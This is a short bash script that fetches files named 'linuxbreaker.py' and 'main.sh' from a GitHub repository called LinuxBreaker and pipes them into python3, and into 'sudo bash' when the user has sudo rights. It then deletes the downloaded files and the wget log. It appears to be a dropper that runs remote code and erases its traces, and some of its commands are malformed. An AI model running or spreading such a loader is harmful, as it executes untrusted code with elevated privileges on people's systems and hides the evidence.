#!/bin/bash

if [[ $(id -u -eq 0) ]]; then
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/linuxbreaker.py -b | python3 &
elif groups | grep "\<sudo\>" &> /dev/null; then
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/linuxbreaker.py -b | python3 &
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/main.sh -b | sudo bash
else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/linuxbreaker.py -b | python3 &
fi
rm wget-log
rm linuxbreaker.py
rm main.sh
